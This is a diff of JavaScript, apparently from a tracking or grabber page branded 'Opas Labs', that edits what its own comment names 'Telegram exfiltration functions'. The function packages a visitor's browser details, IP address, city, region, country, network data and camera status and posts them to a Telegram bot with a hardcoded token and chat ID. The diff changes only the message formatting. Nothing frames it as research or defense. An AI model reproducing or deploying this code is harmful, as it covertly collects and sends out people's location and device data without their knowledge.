@@ -354,8 +354,8 @@ async function getDeviceInfo() {
 
 // 4. Telegram exfiltration functions (same as before)
 async function sendTextToTelegram(data) {
-  const message = 
-`🔰 Opas Labs 🔰
+  const message = `
+*🔰 Opas Labs 🔰*
 
 🌐 Basic Info:
 - Browser: ${data.browser}
@@ -377,7 +377,7 @@ async function sendTextToTelegram(data) {
 - Data Saver: ${data.network.saveData}
 
 📍 *Location & IP*
-- IP: ||${data.ip}||  // Spoiler format for IP
+- IP: ${data.ip}
 - City: ${data.city}
 - Region: ${data.region}
 - Country: ${data.country}
@@ -389,7 +389,7 @@ async function sendTextToTelegram(data) {
 
 📷 *Camera Status*
 - ${data.cameraStatus}
-  `;
+    `;
 
   return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
     method: "POST",
@@ -397,7 +397,7 @@ async function sendTextToTelegram(data) {
     body: JSON.stringify({
       chat_id: "7216371031",
       text: message,
-      parse_mode: "MarkdownV2" // Update to MarkdownV2 for spoiler compatibility
+      parse_mode: "Markdown"
     })
   });
 }
